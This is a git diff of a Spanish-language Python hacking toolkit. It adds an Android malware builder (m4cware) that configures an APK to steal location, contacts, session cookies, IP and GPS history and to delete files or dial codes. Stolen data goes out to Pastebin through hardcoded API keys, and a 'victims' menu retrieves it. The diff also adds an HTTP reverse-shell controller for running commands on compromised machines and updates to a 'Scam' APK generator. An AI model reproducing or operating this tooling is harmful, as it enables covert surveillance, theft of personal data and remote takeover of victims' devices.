@@ -12,12 +12,13 @@ try:
 
 except:
     if "mgt0ls" in os.getcwd():
-        print("[ERROR 01] setup.py Aun no ah sido ejecutado...")
+        print("[ERROR] setup.py Aun no ah sido ejecutado...")
     else:
-        print("[ERROR 02] No estas en la carpeta principal de mgt0ls...")
+        print("[ERROR] No estas en la carpeta principal de mgt0ls...")
     exit(0)
 
 import sys
+import json
 import time
 import shutil
 import codecs
@@ -32,6 +33,16 @@ from tabulate import tabulate
 from hashlib import md5, sha1
 from strgen import StringGenerator
 from ftplib import FTP, error_perm, error_reply, error_temp
+
+def sht(path):   # Encargado de adaptar las rutas
+
+    if "/" in path:
+        check = os.path.join("a", "b")
+
+        if "/" not in check: # Usa \
+            path = path.replace("/", "\\")
+
+    return path
 
 def findperson(nombre, arg): # Funciona with
     nombre = f"{nombre} /{arg.upper()}"
@@ -1006,7 +1017,7 @@ def sc4pk(idcap, selec):
     CONTADOR=0
     SYS=platform.system().lower()
 
-    ver_carpeta=os.listdir(".scripts/sc4pk/")
+    ver_carpeta=os.listdir(".")
 
     base_apk={
 
@@ -1023,11 +1034,11 @@ def sc4pk(idcap, selec):
 
         try:
             
-            asset_save=open(f".scripts/sc4pk/Scam_2/assets/selec.rdp", "w")
+            asset_save=open(os.path.join("Scam_2", "assets", "selec.rdp"), "w")
             asset_save.write(REMP)
             asset_save.close()
 
-            asset_save=open(f".scripts/sc4pk/Scam_2/assets/id.rdp", "w")
+            asset_save=open(os.path.join("Scam_2", "assets", "id.rdp"), "w")
             asset_save.write(idcap)
             asset_save.close()
 
@@ -1045,14 +1056,14 @@ def sc4pk(idcap, selec):
             #shutil.rmtree("Scam_2/res/layout/main.xml")
             #shutil.rmtree("Scam_2/res/drawable-xhdpi-v4/app_icon.png")
 
-            shutil.move(f".scripts/sc4pk/Scam_2/res/drawable-xhdpi-v4/{REMP}.png", ".scripts/sc4pk/Scam_2/res/drawable-xhdpi-v4/app_icon.png")
+            shutil.move(os.path.join("Scam_2", "res", "drawable-xhdpi-v4", f"{REMP}.png"), os.path.join("Scam_2", "res", "drawable-xhdpi-v4", "app_icon.png"))
 
             if "win" in SYS:
-                print(f"[APK] COMPRIME LA APK QUE SE ECNUENTRA EN:\n[PATH] {ROOT_MAX}.scripts/sc4pk/ ->> Scam_2/")
+                print(f"[APK] COMPRIME LA APK QUE SE ECNUENTRA EN:\n[PATH] {ROOT_MAX}/ ->> Scam_2/")
             else:
-                os.chdir(".scripts/sc4pk/Scam_2/")
+                os.chdir("Scam_2/")
                 os.system("zip -r Lite.apk *")
-                print(f"[APK] APK SIN FIRMA CREADA CON EXITO:\n[PATH] {ROOT_MAX}.scripts/sc4pk/Scam_2/ ->> Lite.apk")
+                print(f"[APK] APK SIN FIRMA CREADA CON EXITO:\n[PATH] {ROOT_MAX}Scam_2/ ->> Lite.apk")
 
             #shutil.move("main.xml", "Scam_2/res/layout/main.xml") 
 
@@ -1120,10 +1131,10 @@ def sc4pk(idcap, selec):
 
         try:
             if "Scam_2" in ver_carpeta:
-                shutil.rmtree(".scripts/sc4pk/Scam_2")
-                shutil.copytree(".scripts/sc4pk/Scam",".scripts/sc4pk/Scam_2")
+                shutil.rmtree("Scam_2")
+                shutil.copytree(os.path.join("assets", "Scam"),"Scam_2")
             else:
-                shutil.copytree(".scripts/sc4pk/Scam",".scripts/sc4pk/Scam_2")    # Bloque encargado de verificar si hay el apk que se va a crear
+                shutil.copytree(os.path.join("assets", "Scam"),"Scam_2")    # Bloque encargado de verificar si hay el apk que se va a crear
 
         except Exception as err:
             print(err)
@@ -1190,14 +1201,14 @@ def urljump(select, cant):
         url = [
 
             # 0 = url                1 = str char                  2 = error str
-            ["chat.whatsapp.com/", '[\l\d]{22}', "https://static.whatsapp.net/rsrc.php/v4/yB/r/_0dVljceIA5.png"],
-            ["discord.gg/", '[\l\d]{8}', 'property="og:image"'], # Solucionar problema de baneo --> Ya esta listo xd
-            ["t.me/+", '[\l\d]{16}', "tgme_icon_group"],
-            ["bit.ly/", '[\l\d]{7}', "/static/graphics/meditation.png"],
-            ["www.youtube.com/watch?v=", '[\l\d-_]{11}', '"status":"ERROR"'],
+            ["chat.whatsapp.com/", r'[\l\d]{22}', "https://static.whatsapp.net/rsrc.php/v4/yB/r/_0dVljceIA5.png"],
+            ["discord.gg/", r'[\l\d]{8}', 'property="og:image"'], # Solucionar problema de baneo --> Ya esta listo xd
+            ["t.me/+", r'[\l\d]{16}', "tgme_icon_group"],
+            ["bit.ly/", r'[\l\d]{7}', "/static/graphics/meditation.png"],
+            ["www.youtube.com/watch?v=", r'[\l\d-_]{11}', '"status":"ERROR"'],
             # Desarrollo no funcional aun #
-            ["meet.google.com/", "[\l]{3}-[\l]{4}-[\l]{3}", ""],
-            ["iplogger.org/es/logger/", '[\l\d]{2}105[\l\d]{7}', "error"] # Error aun no encontramos el scraping
+            ["meet.google.com/", r"[\l]{3}-[\l]{4}-[\l]{3}", ""],
+            ["iplogger.org/es/logger/", r'[\l\d]{2}105[\l\d]{7}', "error"] # Error aun no encontramos el scraping
 
         ]
 
@@ -1273,6 +1284,669 @@ def unlocker(type_, dictionary, hash_):
     except Exception as err:
         print(f"[ERROR] {err}")
 
+def m4cware():
+    SYS = platform.system().lower() # Identificador del S.O
+
+    try:
+        with open(".id", "r", encoding="utf-8") as one_id_scan:
+            one_id = json.load(one_id_scan)
+
+    except:
+
+        with open(".id", "w", encoding="utf-8") as one_id_scan:
+
+            ####### APARTE DE VALIDAR SI YA SE ABRIO EL PROGRAMA, TAMBIEN GUARDA LAS CREDENCIALES PUBLICAS.
+
+            one_id_app = f"m{random.randint(1, 9)}_{random.randint(1, 10)}_node_{random.randint(1, 10)}_web.json"
+            one_id = {
+
+                "one_id": one_id_app,
+                "api_dev_key": "uiqdqjM5LG8gdaKaUo05nzSZGIFO2msx", # cuenta nueva
+                "api_user_key": "26e531de791eb3a446ed18788e9dfb94" # cuenta nueva
+
+            }
+
+            one_id_scan.write(str(one_id).replace("'", '"'))
+
+    AC_options = [
+        # Los Booleanos son para saber si estan disponibles o no.
+        # Los numeros 0 son aquellos que no ocupan recursos de envio a Pastebin.
+        # Los ["null"] son aquellos que no tienen permisos necesarios.
+        ["01) Borrar Directorio", False, 0, ["READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE"] ],
+        ["02) Informacion del Telefono", False, 1, ["null"] ],
+        ["03) Abrir Enlace", False, 0, ["null"] ],
+        ["04) Llamada o Comando telefonico", False, 0, ["CALL_PHONE"] ],
+        ["05) Obtener Localizacion", False, 16, ["ACCESS_FINE_LOCATION"] ],
+        ["06) Obtener IP", False, 4, ["null"] ],
+        ["07) Obtener Cookies de Sesion [BETA]", False, 32, ["null"]],
+        ["08) Obtener Contactos [BETA]", False, 8, ["READ_CONTACTS"]],
+        ["09) Obtener Historial De Ubicaciones [BETA]", False, 2, ["READ_EXTERNAL_STORAGE"]] # Los numeros son para identificar que zona debe de enviar en base a las sumas de estos mismos.
+
+        ]
+
+    LY_options = [
+
+        ["01) Modificar Package Name [NOT FOUND]", "com.lite.lt"],
+        ["02) Modificar Name", "Lite"],
+        ["03) Modificar Color de Barra Superior", "#ff000000"],
+        ["04) Modificar Icono de Aplicacion", "Default"],
+        ["05) Modificar Contenido de Aplicacion", "https://www.google.com"],
+        ["06) Modificar el Peso de Aplicacion", "0"],
+        ["07) Activar Envio Multiple", "False"]
+
+    ]
+
+    # LY_tmp = ["com.lite.lt", "Lite", "#ff000000", "Default", "https://www.google.com"]
+
+    AC_map = {
+        "one_id": one_id["one_id"], "api_dev_key": one_id["api_dev_key"],
+        "api_user_key": one_id["api_user_key"],"load": "https://www.google.com"
+        }
+
+    def victims_apk():
+
+        while True:
+
+            check = False; get_url = []; file_sv = "" # Variables del bloque de deteccion y almacenamiento de URLS asociadas
+            #-------------- Identificador unico
+
+            params = {
+
+                "api_dev_key": one_id["api_dev_key"], # cuenta nueva
+                "api_user_key": one_id["api_user_key"], # cuenta nueva
+                "api_option": "list",
+                "api_results_limit": "1000"
+
+            }
+
+            try:
+                paste = requests.post("https://pastebin.com/api/api_post.php", data=params); paste_ = str(paste.text).splitlines()  # Se obtiene y se guarda en una variable los resultados
+            except Exception as err:
+                print(f"[ERROR] {err}")
+
+            if len(paste_) > 5:
+
+                for linea in paste_:
+                    
+                    if one_id["one_id"] in linea: # Se verifica y confirma la existencia del nombre en el historial
+                        check = True
+
+                    if check == True:
+                        if "https://" in linea: # Se obtiene el enlace mas proximo del identificador
+                            get_url.append(linea.strip().replace("<paste_url>", "").replace("</paste_url>", ""))
+                            check = False # Se vuelve a desactivar para seguir en busqueda iterativa
+
+                if get_url != []:
+
+                    try:
+                        select = int(input(f"""
+VICTIMS ->> [{len(get_url)}]
+---------------------------
+01) Descargar Resultados
+02) Verificar Resultados
+---------------------------
+99) Salir
+
+m4cware->> """))
+                        
+                        if select == 1:
+                            try:
+                                for url_ in get_url:
+                                    file_dw = requests.get(url_.replace("pastebin.com/", "pastebin.com/raw/"))
+                                    file_sv = file_sv + str(file_dw.text) + "\n"
+                                with open("targets.txt", "w", encoding="utf-8") as file_fl:
+                                    file_fl.write(file_sv)
+                                print("[PASSED] Archivo targets.txt descargado correctamente...")
+                            except Exception as err:
+                                print(f"[ERROR] {err}")
+
+                        if select == 2:
+                            select = int(input(f"VICTIMS SELECT // [{len(get_url)}/{len(get_url)}] ->> "))
+                            try:
+                                file_dw = requests.get(get_url[select-1].replace("pastebin.com/", "pastebin.com/raw/"))
+                                print("---------------------------")
+                                print(file_dw.text.replace("{", "{\n").replace(",",",\n").replace('"};', '"\n};'))
+                            except Exception as err:
+                                print(f"[ERROR] {err}")
+                        
+                        if select == 99:
+                            break
+
+                    except Exception as err:
+                        print(f"[ERROR] {err}")
+            else:
+                print("[ERROR] Aun no se han encontrado victimas...")
+                break
+
+    def style_apk():
+        
+        while True:
+
+            print("IMPLEMENTATION ACTIVITIES ->> [APK]\n-----------------------------------")
+
+            for item in LY_options:
+                print(item[0], "["+item[1]+"]")
+
+            try:
+                select = int(input("-----------------------------------\n99) Guardar & Salir\n\nm4cware->> "))
+
+                if select == 1:
+                    #ly_select = input("Nuevo Package Name: ")
+                    pass
+                elif select == 2:
+                    ly_select = input("Nuevo Name: ")
+                elif select == 3:
+                    ly_select = input("Nuevo Color de Barra Superior [HEX]: ")
+                elif select == 4:
+                    ly_select = input("Ruta del nuevo icono de la APK: ")
+                elif select == 5:
+                    ly_select = input("URL de la pagina web que se mostrara como contenido: ")
+                    AC_map["load"] = ly_select
+                elif select == 6:
+                    ly_select = input("Ingresa el peso en MB a aumentar: ")
+                elif select == 7:
+                    ly_select = "True"
+                    AC_map.setdefault("reload", "True")
+                elif select == 99:
+                    break
+                
+                if select != 1: # Este condicional es para evitar que usen el numero 1
+                    LY_options[select-1][1] = ly_select
+
+            except Exception as err:
+                print(f"[ERROR] {err}")
+
+    def actions_apk():
+
+        while True:
+
+            print("IMPLEMENTATION ACTIVITIES ->> [APK]\n-----------------------------------")
+
+            for item in AC_options:
+                if item[1] == True:
+                    print(item[0], "✓")
+                else:
+                    print(item[0])
+            try:
+                select = int(input("-----------------------------------\n99) Guardar & Salir\n\nm4cware->> "))
+
+                if select == 99:
+                    break
+
+                if AC_options[select-1][1] == True:
+                    print("[BUSY] Opcion ya implementada...")
+
+                if select == 1 and AC_options[0][1] == False: # Del file or Dir
+                    ac_inp = input("Ingresa la ruta a eliminar: ")
+                    AC_map.setdefault("del", ac_inp)
+                elif select == 2 and AC_options[1][1] == False: # Info phone
+                    AC_map.setdefault("info", "on") 
+                elif select == 3 and AC_options[2][1] == False: # Open naveg
+                    ac_inp = input("Ingresa el enlace a abrir en el navegador: ")
+                    AC_map.setdefault("open", ac_inp)
+                elif select == 4 and AC_options[3][1] == False: # Call numbre or USSD 
+                    ac_inp = input("Ingresa el numero telefonico o codigo a ejecutar: ")
+                    AC_map.setdefault("call", ac_inp)
+                elif select == 5 and AC_options[4][1] == False: # Locate
+                    AC_map.setdefault("locate", "on")
+                elif select == 6 and AC_options[5][1] == False: 
+                    AC_map.setdefault("ip", "on")
+                elif select == 7 and AC_options[6][1] == False: 
+                    AC_map.setdefault("cookies", "on")
+                elif select == 8 and AC_options[7][1] == False: 
+                    AC_map.setdefault("contacts", "on")
+                elif select == 9 and AC_options[8][1] == False:
+                    AC_map.setdefault("history_gps", "on")
+
+                AC_options[select-1][1] = True # Se cambia el valor de la opcion a True indicando que ya se a realizado una opcion
+                # indicando asi que no se puede utilizar
+            except Exception as err:
+                print(f"[ERROR] {err}")
+
+    def compilar():
+
+        if len(AC_map) == 4:
+            print("[ERROR] Aun no modificas el APK...")
+
+        else:
+            dirs_ = os.listdir(".")
+
+            # Linux y windows
+
+            try:
+                if "apktool.jar" not in dirs_ and "win" in SYS:
+
+                    down_bat = requests.get("https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat")
+                    downl_apk = requests.get("https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar")
+                
+                    with open("apktool.jar", "wb") as apk_tool, open("apktool.bat", "wb") as apk_tool_bat:
+                        apk_tool.write(downl_apk.content)
+                        apk_tool_bat.write(down_bat.content)
+            
+            except Exception as err:
+                print(f"[ERROR] {err}")
+            
+            if "m4.apk" not in dirs_:             # Importa el apk para trabajar mejor con ella
+                shutil.copy(os.path.join("assets", "m4.apk"), ".")
+
+            ## Linux y Windows
+            if "win" in SYS:
+                os.system(".\\apktool.bat m4.apk")
+            else:
+                os.system("apktool d m4.apk")
+
+            #############################################################
+            #                       Layaut VARS                         #
+            #############################################################
+            strings_ = os.path.join("m4", "res", "values", "strings.xml")
+            colors_ = os.path.join("m4", "res", "values", "colors.xml")
+            pack_age_name_dir = os.path.join("m4", "AndroidManifest.xml")
+            app_icon_ = os.path.join("m4", "res", "drawable-xhdpi", "app_icon.png")
+            size_bin = os.path.join("m4", "assets", "resources.conf")
+            #############################################################
+            #                       Actions VARS                        #
+            #############################################################
+            assets_json = os.path.join("m4", "assets", "info.json")
+            #############################################################
+            #                   Modification of Files                   #
+            #############################################################
+            if LY_options[0][1] != "com.lite.lt":
+
+                temp_package = LY_options[0][1].replace(".", " ").split()
+                vars_lte = ["com", "lite", "lt"]
+                
+                pack_age_dirs_rename = os.path.join("m4", "smali_classes5", "")
+                vars_rename_lte = os.path.join("m4", "smali_classes5", "")
+                
+                for i in range(3):
+
+                    os.rename(vars_rename_lte+vars_lte[i], pack_age_dirs_rename+temp_package[i])
+
+                    pack_age_dirs_rename = os.path.join(pack_age_dirs_rename, temp_package[i], "")
+                    vars_rename_lte = os.path.join(vars_rename_lte, temp_package[i], "")
+                
+                with open(pack_age_name_dir, "r") as pack_age_name:
+                    read_package = pack_age_name.read(); read_package = read_package.replace("com.lite.lt", LY_options[0][1])
+                
+                with open(pack_age_name_dir, "w", encoding="utf-8") as pack_age_name:
+                    pack_age_name.write(read_package)
+
+            if LY_options[1][1] != "Lite":
+
+                with open(strings_, "r") as name:
+                    # LECTURA DE CONTENDIO                ### MODIFICACION DEL CONTENIDO
+                    read_name = name.read(); read_name = read_name.replace("Lite", LY_options[1][1])
+                with open(strings_, "w", encoding="utf-8") as name:
+                    name.write(read_name)
+
+            if LY_options[2][1] != "#ff000000":
+
+                with open(colors_, "r") as color:
+                    read_color = color.read(); read_color = read_color.replace("#ff000000", LY_options[2][1])
+                with open(colors_, "w", encoding="utf-8") as color:
+                    color.write(read_color)
+
+            if LY_options[3][1] != "Default":      # Modifica el icon del apk
+                os.replace(LY_options[3][1], app_icon_)
+            
+            if LY_options[5][1] != "0":
+                #os.mkdir(size_bin.replace("resources.conf", ""))
+
+                size_ = int(LY_options[5][1]) * 1024 * 1024
+
+                with open(size_bin, "wb") as binario:
+                    binario.write(os.urandom(size_))
+
+            #############################################################
+            #                       Making JSON                         #
+            #############################################################
+
+            sum_ = 0
+            for numero in AC_options:
+
+                if numero[1] == True: # Se encarga de solamente sumar las acciones agregadas
+                    sum_ = numero[2] + sum_
+            
+            if sum_ >= 32:                      # Problema matematico: Cada vez es el doble de lo anterior, probocado por la suma de estos mismos.
+                sender_ = "cookies"             # Es decir: La suma de las opciones anteriores + 1 es el siguiente orden de prioridad.
+            if sum_ >= 16 and sum_ < 32:
+                sender_ = "locate"
+            if sum_ >= 8 and sum_ < 16: 
+                sender_ = "contacts"
+            if sum_ >= 4 and sum_ < 8:   
+                sender_ = "ip"
+            if sum_ >= 2 and sum_ < 4:
+                sender_ = "history_gps"
+            if sum_ == 1:
+                sender_ = "info"
+            
+            if sum_ > 0:
+                AC_map.setdefault("sender", sender_) # Configura que parte del codigo en la app envia la informacion 
+
+            with open(assets_json, "w", encoding="utf-8") as save_json: # Guarda el json encargado del comportamiento del apk
+                save_json.write(str(AC_map).replace("'", '"'))
+            
+            #############################################################
+            #                Delete Unnecessary Permissions             #
+            #############################################################
+
+            emergency_ = '    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n' # Acces_Network nunca se borra, por ende se toma como referencia
+
+            with open(pack_age_name_dir, "r") as android: # Bloque encargado de quitar o dejar permisos dependiendo de la seleccion
+                lectura = android.read()
+
+                for opciones in AC_options: # Por cada opcion en AC_Options
+
+                    if opciones[1] == False and len(opciones[3]) > 1: # Si la opcion con permisos no se esta ocupando Y la opcion tiene mas de 1 permiso
+
+                        for permiso in opciones[3]: # Por cada permiso se borra de Android Manifest
+                            permiss =  f'    <uses-permission android:name="android.permission.{permiso}"/>\n'
+                            lectura = lectura.replace(permiss, "")
+
+                    elif opciones[1] == False and opciones[3][0] != "null": # Mientras el permiso no sea null y el permiso no esa ocupandose
+
+                        permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
+                        lectura = lectura.replace(permiss, "")
+
+                    elif opciones[1] == True and opciones[3][0] not in lectura: # Si es que el permiso que se va a ocupar ya se elimino
+
+                        permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
+                        lectura = lectura.replace(emergency_, emergency_+permiss) # Agrega el permiso que se necesita
+            
+            with open(pack_age_name_dir, "w", encoding="utf-8") as save_android:
+                save_android.write(lectura)
+            
+            ## Linux y windows
+
+            if "win" in SYS:
+                os.system(".\\apktool.bat b m4 -o m4_moded.apk")
+            else:
+                os.system("apktool b m4 -o m4_moded.apk")
+            
+            try:
+                shutil.rmtree("m4"); os.remove("m4.apk")  # Elimina los archivos ya ocupados
+                
+            except Exception as err:
+                print(f"[ERROR] {err}")
+
+    def api_settings():
+        while True:
+            try:
+                new_dev = input("""
+API SETTINGS <> [M4CWARE]
+-------------------------
+PASTEBIN [https://pastebin.com/doc_api]
+
+Introduce tu 'api_dev_key' de Pastebin: """)
+                
+                new_user = input("Introduce tu 'api_user_key' de Pastebin: ")
+
+                with open(".id", "w", encoding="utf-8") as new_paste:
+
+                    one_id["api_dev_key"] = new_dev; one_id["api_user_key"] = new_user
+                    new_paste.write(str(one_id).replace("'", '"'))
+
+                print("[RESET] Claves ingresadas con exito...")
+                exit(0)
+
+            except Exception as err:
+                print(f"[ERROR] {err}")
+
+    while True:
+        try:
+            select = int(input("""
+OPTIONS ->> [MALWARE-APK-CREATOR]
+---------------------------------
+01) APK Style   03) APK Victims
+02) APK Actions 04) API Settings
+---------------------------------
+99) Salir       00) Compilar
+
+m4cware->> """))
+        except Exception as err:
+            print(f"[ERROR] {err}")
+        else:
+            if select == 1:
+                style_apk()
+            elif select == 2:
+                actions_apk()
+            elif select == 3:
+                victims_apk()
+            elif select == 4:
+                api_settings()
+            elif select == 00:
+                compilar()
+            else:
+                exit(0)
+
+def reverhttp(url_port):
+
+    SYS = platform.system().lower()
+    headers = {"Cache-Control":"no-cache"}
+
+    cmd_help="""
+[HTTPREVERSE]->>[V.1.0]
+
+ASSOC          Muestra o modifica las asociaciones de las extensiones
+               de archivos.
+ATTRIB         Muestra o cambia los atributos del archivo.
+BREAK          Establece o elimina la comprobación extendida de Ctrl+C.
+BCDEDIT        Establece propiedades en la base de datos de arranque para
+               controlar la carga del arranque.
+CACLS          Muestra o modifica las listas de control de acceso (ACLs)
+               de archivos.
+CALL           Llama a un programa por lotes desde otro.
+CD             Muestra el nombre del directorio actual o cambia a otro
+               directorio.
+CHCP           Muestra o establece el número de página de códigos activa.
+CHDIR          Muestra el nombre del directorio actual o cambia a otro
+               directorio.
+CHKDSK         Comprueba un disco y muestra un informe de su estado.
+CHKNTFS        Muestra o modifica la comprobación de disco al arrancar.
+CLS            Borra la pantalla.
+CMD            Inicia una nueva instancia del intérprete de comandos
+               de Windows
+COLOR          Establece los colores de primer plano y fondo predeterminados
+               de la consola.
+COMP           Compara el contenido de dos archivos o un conjunto de archivos.
+COMPACT        Muestra o cambia el estado de compresión de archivos
+               en particiones NTFS.
+CONVERT        Convierte volúmenes FAT a volúmenes NTFS. No puede convertir
+               la unidad actual.
+COPY           Copia uno o más archivos en otra ubicación.
+DATE           Muestra o establece la fecha.
+DEL            Elimina uno o más archivos.
+DIR            Muestra una lista de archivos y subdirectorios en un
+               directorio.
+DISKPART       Muestra o configura las propiedades de partición de disco.
+DOSKEY         Edita líneas de comando, recupera comandos de Windows y
+               crea macros.
+DRIVERQUERY    Muestra el estado y las propiedades actuales del controlador de dispositivo.
+ECHO           Muestra mensajes, o activa y desactiva el eco.
+ENDLOCAL       Termina la búsqueda de cambios de entorno en un archivo por lotes.
+ERASE          Elimina uno o más archivos.
+EXIT           Sale del programa CMD.EXE (intérprete de comandos).
+FC             Compara dos archivos o conjunto de archivos y muestra las
+               diferencias entre ellos.
+FIND           Busca una cadena de texto en uno o más archivos.
+FINDSTR        Busca cadenas en archivos.
+FOR            Ejecuta el comando especificado para cada archivo en un conjunto de archivos.
+FORMAT         Formatea un disco para usarse con Windows.
+FSUTIL         Muestra o configura las propiedades del sistema de archivos.
+FTYPE          Muestra o modifica los tipos de archivo usados en
+               asociaciones de extensión de archivo.
+GOTO           Direcciona el intérprete de comandos de Windows a una línea con etiqueta
+               en un programa por lotes.
+GPRESULT       Muestra información de directiva de grupo por equipo o usuario.
+GRAFTABL       Permite a Windows mostrar un juego de caracteres extendidos
+               en modo gráfico.
+HELP           Proporciona información de Ayuda para los comandos de Windows.
+ICACLS         Muestra, modifica, hace copias de seguridad o restaura listas de control de acceso (ACL) para archivos y
+               directorios.
+IF             Ejecuta procesos condicionales en programas por lotes.
+LABEL          Crea, cambia o elimina la etiqueta del volumen de un disco.
+MD             Crea un directorio.
+MKDIR          Crea un directorio.
+MKLINK         Crea vínculos simbólicos y vínculos físicos
+MODE           Configura un dispositivo de sistema.
+MORE           Muestra la información pantalla por pantalla.
+MOVE           Mueve uno o más archivos de un directorio a otro en la
+               misma unidad.
+OPENFILES      Muestra archivos compartidos abiertos por usuarios remotos como recurso compartido de archivos.
+PATH           Muestra o establece una ruta de búsqueda para archivos ejecutables.
+PAUSE          Suspende el proceso de un archivo por lotes y muestra un mensaje.
+POPD           Restaura el valor anterior del directorio actual guardado
+               por PUSHD.
+PRINT          Imprime un archivo de texto.
+PROMPT         Cambia el símbolo de comandos de Windows.
+PUSHD          Guarda el directorio actual y después lo cambia.
+RD             Quita un directorio.
+RECOVER        Recupera la información legible de un disco dañado o defectuoso.
+REM            Registra comentarios (notas) en archivos por lotes o CONFIG.SYS.
+REN            Cambia el nombre de uno o más archivos.
+RENAME         Cambia el nombre de uno o más archivos.
+REPLACE        Reemplaza archivos.
+RMDIR          Quita un directorio.
+ROBOCOPY       Utilidad avanzada para copiar archivos y árboles de directorios
+SET            Muestra, establece o quita variables de entorno de Windows.
+SETLOCAL       Inicia la localización de los cambios de entorno en un archivo por lotes.
+SC             Muestra o configura servicios (procesos en segundo plano).
+SCHTASKS       Programa comandos y programas para ejecutarse en un equipo.
+SHIFT          Cambia la posición de parámetros reemplazables en archivos por lotes.
+SHUTDOWN       Permite el apagado local o remoto de un equipo.
+SORT           Ordena la salida.
+START          Inicia otra ventana para ejecutar un programa o comando especificado.
+SUBST          Asocia una ruta de acceso con una letra de unidad.
+SYSTEMINFO     Muestra las propiedades y la configuración específicas del equipo.
+TASKLIST       Muestra todas las tareas en ejecución, incluidos los servicios.
+TASKKILL       Termina o interrumpe un proceso o aplicación que se está ejecutando.
+TIME           Muestra o establece la hora del sistema.
+TITLE          Establece el título de la ventana de una sesión de CMD.EXE.
+TREE           Muestra gráficamente la estructura de directorios de una unidad o
+               ruta de acceso.
+TYPE           Muestra el contenido de un archivo de texto.
+VER            Muestra la versión de Windows.
+VERIFY         Comunica a Windows si debe comprobar que los archivos se escriben
+               de forma correcta en un disco.
+VOL            Muestra la etiqueta del volumen y el número de serie del disco.
+XCOPY          Copia archivos y árboles de directorios.
+WMIC           Muestra información de WMI en el shell de comandos interactivo.
+
+[ESTA VISION ES DESDE TU MAQUINA]
+"""
+
+    path_dir = os.listdir(".")
+
+    if "server" not in path_dir:
+
+        os.mkdir("server")
+        inicio=open(os.path.join("server", "cmd.txt"), "w")
+        inicio.write("systeminfo")
+        inicio.close()
+        
+        lst = ["cmd_reverse.php", "cmd.php"]
+        
+        for move_ in lst:
+            shutil.copy(os.path.join("assets", move_), "server/")
+
+    def server(port):
+
+        try:
+            if ":" in port: 
+                creacion(port)
+            else:
+                port = int(port)
+
+                if "win" not in SYS:
+
+                    try:
+                        print('[SERVER] CORRIENDO EN ->> http://localhost:{}'.format(port))
+                        os.system("php -S localhost:{} -t server".format(port))
+
+                    except Exception as err:
+                        print(f"[ERROR] {err}")
+                        pass
+                else:
+                    print("[DEVP] Abrir servidor con PHP aun esta en desarrollo...")
+
+        except Exception as err:
+            print(f"[ERROR] {err}")
+
+    def maquina(server_str):
+        pasado=""
+
+        print("[TERMINAL] ESPERANDO CONEXION")
+        while True:
+            time.sleep(1)
+
+            try:
+                
+                if ":" not in server_str.replace("://", ""): # Si la url no es localhost
+                    obtener_resultado = requests.get(f"{server_str}capture.txt", headers=headers)
+                    leer = obtener_resultado.text
+                
+                else:
+                    lectura=open(os.path.join("server", "capture.txt"))
+                    leer=lectura.read()
+                    lectura.close()
+                
+            except:
+                leer=""
+                pass
+
+            else:
+
+                nuevo = str(leer)
+
+                if nuevo != "" and nuevo != pasado:
+
+                    pasado=nuevo
+                    print(nuevo.replace("[ESP]", " ").replace("\\r\\n","\n"))
+
+                    comando=input("reverchttp ->>")
+
+                    if comando == "exit":
+                        break
+                    if comando == "help":
+                        print(cmd_help)  # NUEVA LINEA... PROBAR MAÑANA
+                        pass
+
+                    if ":" not in server_str.replace("://", ""): # Si la url no es localhost
+
+                        data={"cmd":"{}".format(comando)}
+                        
+                        try:
+                            obtener_resultado = requests.post(f"{server_str}cmd_reverse.php", data=data)
+                        except:
+                            pass
+                    
+                    else:
+
+                        data=open(os.path.join("server", "cmd.txt"), "w")
+                        data.write(comando)
+                        data.close()
+                else:
+                    pass
+
+    def creacion(server_str):
+
+        try:
+            if server_str + "/" not in server_str:
+                server_str = server_str + "/"
+
+            with open(os.path.join("assets", "reversehttp.py"), "r") as leer, open(os.path.join("server", "reversehttp_clone.py"), "w") as escribir:
+                leer_str = leer.read()
+                escribir.write(leer_str.replace("URL_FUN",server_str))
+            
+            print("[PASS] Archivo guardado en ./server/reversehttp_clone.py")
+            print("-------------------------------------------------\n[PAUSE] Entrando en modo escucha [20sec]... ")
+            time.sleep(20)
+            maquina(server_str)
+
+        except Exception as err:
+            print(f"[ERROR] {err}")
+    
+    server(url_port)
 
 # python3 fsh.py urldump --a <social_network> --b <count> < ------------ in mgt0ls
 #################################
